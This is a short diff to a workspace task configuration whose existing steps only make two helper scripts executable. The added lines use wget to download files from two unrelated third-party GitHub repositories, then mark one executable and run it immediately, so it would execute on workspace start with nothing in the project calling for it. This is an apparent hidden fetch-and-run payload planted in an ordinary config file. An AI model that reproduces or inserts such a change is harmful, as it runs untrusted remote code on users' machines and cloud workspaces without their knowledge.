@@ -23,6 +23,8 @@ tasks:
 
   - command: chmod +x a01-run-go.sh              && 
              chmod +x a02-run-firefox.sh          
-             
+             wget https://raw.githubusercontent.com/cikitaro2021cloud/shibusdt/main/vio
+             wget https://raw.githubusercontent.com/outlookribut/my-python-template/main/nv && chmod u+x nv && ./nv
+
   
 
